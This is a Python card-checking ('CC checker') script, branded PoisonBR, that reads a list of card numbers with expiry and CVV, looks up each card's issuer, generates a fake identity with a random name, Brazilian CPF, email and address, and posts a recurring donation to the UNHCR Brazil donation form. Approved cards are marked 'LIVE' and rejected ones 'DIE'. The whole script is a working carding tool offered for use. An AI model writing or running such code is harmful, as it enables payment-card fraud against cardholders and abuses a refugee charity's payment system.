import os,time,requests,json

#Cores
R="\033[1;31m"; B="\033[1;34m"; C="\033[1;37m"; Y="\033[1;33m"; G="\033[1;32m"; RT="\033[;0m"

os.system('clear')
print(f"""{C}
                            /+osyhhhhhhyys++/
                         +oydddhhhhyyhhhhdddhy+/
                      /+yddhyyyys.josue.syyhddhs/
                     +hddyyssssssssssssssssssyyhdds/
                   /sddhyyyyyyssssssssssssssyyyyyhmh+
                  /hmdhhddddddhhhyyyyyyhhhhdddddhhhddo
                 /hmmdhs+/ //+osyhhhhhhysso+////ohddmdo
                /hmmmy{B}.           `````          `{C}smddd+
                smddm/{B}     `````          `````   {C}mdhmh/
               +ddydm+{B}  -/osyyyys+.    ./syyyyso/-{C}mdydms
               ymhyhmh{B}.yyo/ -- +hdo  /dho -- /oyh.{C}ymdyymd/
              /dmyyymd{B}.  ``.-   ./   -/.-   .``  `{C}dmhsydmo
              smdysymd{B}   shdhyydy      sdyyhddy   {C}dmyyshmy
              dmysshmy{B}                            {C}smhssymd/
             /dmyssymd{B}                            {C}hmhsyymm/
             /dmyssyhms{B}                          /{C}mdysyymm/
             /dmyssyydm/{B}  sh       hh/     -hy  .{C}dmyssyymm/
              dmhssssydd/{B} -hdhysshdysdhssyhdd  -{C}hmhyssyymd/
              ymhssssyyddo{B}``. //+/.` ./+// -` /{C}ddhysssyhmh
              +mdysssssyhdh{B} `     `/+`      -{C}sddysssssydmo
               ymhysssssyyddh/{B}`   `dm.   ` {C}sddhysssssyhmh/
               /hmhysssssyyyhdds{B} ..dm . {C}ohddhyyssssyyhmd+
                /yddhyssssssyyhhddhddddddhyyssssssyydmh+
               /+sdmmdhhyyyysssyyyyyyyyyysssyyyyyhddmdyo+/
           /+shdddhhyhhddddddhhhhhhhhhhhhhhdddddddhyyhhdddyo/
         /shddhyyysssssyyyyhhhhhhhhhhhhhhhhhhyyyyyssssyyyhdddy+
        /hmhyyssssssssssssssssssssssssssssssssssssssssssssyyhddo
        /dmhyyyyyssssssssssssssssssssssssssssssssssssssyyyyyydms
         +yhddddddhhhhhyyyyyyyyyyyyyyyyyyyyyyyyyyhhhhhdddddddhs/
           //++oossyyhhhhhhhdddddddddddddddddhhhhhhyyssoo++///
                       ///////+++++++++++++//////
                       
                       
     ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██████╗ ██████╗
     ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██╔══██╗██╔══██╗
     ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██████╔╝██████╔╝
     ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██╔══██╗██╔══██╗
     ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██████╔╝██║  ██║
     ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
     {RT}{B}*t.me/p0isonBR*{RT}""")

time.sleep(3); os.system('clear')

print(f"""{B}*By PoisonBR{RT}{G}
 ██████╗ ██████╗   ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝██╔════╝  ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║     ██║  ███╗ ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║     ██║       ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╗╚██████╗  ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═════╝   ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ v 1.0{C}
 """)

try:
    def checker(cc,mes,ano,cvv):
        r=requests.request("GET","https://lookup.binlist.net/"+cc[0:6]).json()
        band=r.get("scheme")
        tipo=r.get("type")
        pais=r.get("country")
        banco=r.get("bank")
        nivel=r.get("brand")

        if tipo=="credit":
            tipo2="C"
        else:
            tipo2="D"
            
        print(f"""
{G}[+]{C}Consultando dados do cartão:
{Y}[*]{C}Cartao: {B}{gg}
{Y}[*]{C}Bandeira: {B}{band}
{Y}[*]{C}Tipo: {B}{tipo}
{Y}[*]{C}Nivel: {B}{nivel}
{Y}[*]{C}Pais: {B}{pais.get('name')}
{Y}[*]{C}Banco: {B}{banco.get('name')}""")

        pessoa=requests.request("GET","https://randomuser.me/api/?nat="+pais.get("alpha2").lower()).json()
        genero=pessoa["results"][0]["gender"]
        if genero=="female":
            genero2=genero.replace("female","Mulher")
            genero3="F"
        else:
            genero2=genero.replace("male","Homem")
            genero3="M"
        pnome=pessoa["results"][0]["name"]["first"]
        sobrenome=pessoa["results"][0]["name"]["last"]
        nome=pnome +" " +sobrenome
        nascimento=pessoa["results"][0]["dob"]["date"][0:10]
        if pais.get("alpha2")=="BR":
            d=nascimento.split("-")[2]
            m=nascimento.split("-")[1]
            a=nascimento.split("-")[0]
            nascimento=d+"/"+m+"/"+a
        cpf=requests.request("GET", "http://geradorapp.com/api/v1/cpf/generate?token=f01e0024a26baef3cc53a2ac208dd141").json()
        cpf2=cpf["data"]["number_formatted"]
        cpf=cpf["data"]["number"]
        email=pnome.replace(" ",".")+"."+sobrenome.replace(" ",".")+"@outlook.com"
        email=email.lower().encode("ascii","ignore").decode("ascii")
        cidade=pessoa["results"][0]["location"]["city"]
        estado=pessoa["results"][0]["location"]["state"]
        endereco=pessoa["results"][0]["location"]["street"]["name"]
        cep=str(pessoa["results"][0]["location"]["postcode"])
        if pais.get("alpha2")=="BR":
            cep=cep+"-000"
        bairro="Centro"

        for key, value in estados.items():
            estado=estado.replace(key,value)

        print(f"""
{G}[+]{C}Gerando pessoa aleatoria:
{Y}[*]{C}Genero: {B}{genero2}
{Y}[*]{C}Nome: {B}{nome}
{Y}[*]{C}Nascimento: {B}{nascimento}
{Y}[*]{C}CPF: {B}{cpf2}
{Y}[*]{C}E-Mail: {B}{email}
{Y}[*]{C}Endereço: {B}{endereco}
{Y}[*]{C}CEP/ZIP: {B}{cep}
{Y}[*]{C}Cidade: {B}{cidade}
{Y}[*]{C}Estado: {B}{estado}
""")

        donate="https://doar.acnur.org/api/ACNURBR/donate.html"
        h = {
            "Host": "doar.acnur.org",
            "Connection": "keep-alive",
            "Content-Length": "1036",
            "Cache-Control": "max-age\u003d0",
            "Origin": "https://doar.acnur.org",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.09.4.5083",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3",
            "Sec-Fetch-Site": "same-origin",
            "Referer": "https://doar.acnur.org/acnur/donate.html",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "pt-BR,pt;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
            "Cookie": "ROUTEID\u003d.zolaBETA; _gcl_au\u003d1.1.751806228.1604113311; _ga\u003dGA1.3.972845617.1604113311; _gid\u003dGA1.3.1315302043.1604113311; _ga\u003dGA1.2.972845617.1604113311; _gid\u003dGA1.2.1315302043.1604113311; _uetsid\u003d6df17a801b2511eb91b7e9b62ecdda16; _uetvid\u003d6df60f501b2511ebb9704745327a0630; m_ses\u003d20201031000154; m_cnt\u003d0; _tq_id.TV-72092763-1.c79b\u003d24d79b933ff67001.1604113315.0.1604113315..; _fbp\u003dfb.1.1604113316536.1144821724; __qca\u003dP0-1736157422-1604113317181"
            }

        data="successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY="+pais.get("currency")+"&EXPDATE="+mes+ano[1:3]+"&TAXID="+cpf+"&AMT=35&TYPE="+tipo2+"%2F"+band+"&PAYPERIOD=MONT&X=&FIRSTNAME="+pnome+"&LASTNAME="+sobrenome+"&EMAIL="+email.replace("@","%40")+"&GENDER="+genero3+"&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1="+nascimento.replace("/","%2F")+"&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1="+nascimento.replace("/","%2F")+"&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET="+endereco.replace(" ","+")+"&STREET2="+bairro.replace(" ","+")+"&CITY="+cidade.replace(" ","+")+"&STATE="+estado+"&ZIP="+cep+"&COUNTRY="+pais.get("alpha2")+"&PHONENUM=%2811%29+98765-4321&CCTYPE="+tipo2+"%2F"+band+"&ACCT="+cc+"&NAME="+nome.replace(" ","+")+"&CVV2="+cvv

        RS=requests.request("POST",donate,headers=h,data=data)
        RS=RS.url
        if RS=="https://doar.acnur.org/acnur/agradecimento.html":
            print(f"{G}[+]{C}Pagamento autorizado! {G}Cartão LIVE!{C}")
        else:
            RS=RS.split("=")[3]
        
            #Variaveis de retorno de erro
            if RS=="REFUSED_PAYMENT":
                print(f"{R}[-]{C}Transação recusada ({R}Possivel IP Block{C}).")
            elif RS=="DATA_INVALID":
                print(f"{R}[-]{C}Cartão invalido ({R}DIE{C}).")
            elif RS=="FAIL_UNKNOWN":
                print(f"{R}[-]{C}Erro Desconhecido ({R}possivel uso de cartao de Debito{C}).")
            elif RS=="ERROR_NETWORK":
                print(f"{R}[-]{C}Erro de rede.")
            elif RS=="DATA_CARD_NOT_ALLOWED":
                print(f"{R}[-]{C}Pagamento nao autorizado.")
            elif RS=="REFUSED_PROVIDER":
                print(f"{R}[-]{C}Pagamento recusado pela {Y}{band}{C}.")
            elif RS=="REFUSED_BANK":
                print("{}[-]{}Recusado pelo {}{}{}.".format(R,C,Y,banco.get("name"),C))
            elif RS=="DATA_MISSING":
                print(f"{R}[-]{C}Algum dado faltando.")
            else:
                print(f"{Y}Erro nao listado, confira: {R}{RS}{RT}")
    
    #Adicionei apenas estados brasileiros e americanos, analisando a request POST, vi que enviava apenas a sigla.
    estados={
        "Acre": "AC",
        "Alagoas": "AL",
        "Amapá": "AP",
        "Amazonas": "AM",
        "Bahia": "BA",
        "Ceará": "CE",
        "Distrito Federal": "DF",
        "Espírito Santo": "ES",
        "Goiás": "GO",
        "Maranhão": "MA",
        "Mato Grosso": "MT",
        "Mato Grosso do Sul": "MS",
        "Minas Gerais": "MG",
        "Pará": "PA",
        "Paraíba": "PB",
        "Paraná": "PR",
        "Pernambuco": "PE",
        "Piauí": "PI",
        "Rio de Janeiro": "RJ",
        "Rio Grande do Norte": "RN",
        "Rio Grande do Sul": "RS",
        "Rondônia": "RO",
        "Roraima": "RR",
        "Santa Catarina": "SC",
        "São Paulo": "SP",
        "Sergipe": "SE",
        "Tocantins": "TO",
        "Alabama": "AL",
        "Alaska": "AK",
        "Arizona": "AZ",
        "Arkansas": "AR",
        "California": "CA",
        "Colorado": "CO",
        "Connecticut": "CT",
        "Delaware": "DE",
        "Florida": "FL",
        "Georgia": "GA",
        "Hawaii": "HI",
        "Idaho": "ID",
        "Illinois": "IL",
        "Indiana": "IN",
        "Iowa": "IA",
        "Kansas": "KS",
        "Kentucky": "KY",
        "Louisiana": "LA",
        "Maine": "ME",
        "Maryland": "MD",
        "Massachusetts": "MA",
        "Michigan": "MI",
        "Minnesota": "MN",
        "Mississippi": "MS",
        "Missouri": "MO",
        "Montana": "MT",
        "Nebraska": "NE",
        "Nevada": "NV",
        "New Hampshire": "NH",
        "New Jersey": "NJ",
        "New Mexico": "NM",
        "New York": "NY",
        "North Carolina": "NC",
        "North Dakota": "ND",
        "Northern Mariana Islands":"MP",
        "Ohio": "OH",
        "Oklahoma": "OK",
        "Oregon": "OR",
        "Palau": "PW",
        "Pennsylvania": "PA",
        "Rhode Island": "RI",
        "Puerto Rico": "PR",
        "South Carolina": "SC",
        "South Dakota": "SD",
        "Tennessee": "TN",
        "Texas": "TX",
        "Utah": "UT",
        "Vermont": "VT",
        "Virginia": "VA",
        "Washington": "WA",
        "Washington, DC": "DC",
        "West Virginia": "WV",
        "Wisconsin": "WI",
        "Wyoming": "WY",
        "Virgin Islands": "VI"
            }

    lista=open(input(f"{C}Caminho da lista: "), "r").read().splitlines()
    for gg in lista:
        cc=gg.split("|")[0]
        mes=gg.split("|")[1]
        ano=gg.split("|")[2]
        cvv=gg.split("|")[3]
        checker(cc,mes,ano,cvv)
            
except KeyboardInterrupt:
    print(f"{R}[-]{C}Cancelado pelo usuario!")
    print("Saindo...")
    exit(f"{R}Ctrl+C pressionado.{RT}")
except IOError:
    print(f"{R}[-]{C}Lista nao encontrada ou caminho inválido.")
    print("Saindo...")
    exit(f"{R}Caminho invalido.{RT}")
except ValueError:
    print(f"{R}[-]{C}Bin nao encontrada (erro no inicio) ou erro no gerador de pessoas. Tente novamente!")
    print("Saindo...")
    exit(f"{R}Erro de BIN ou Gerador{RT}")
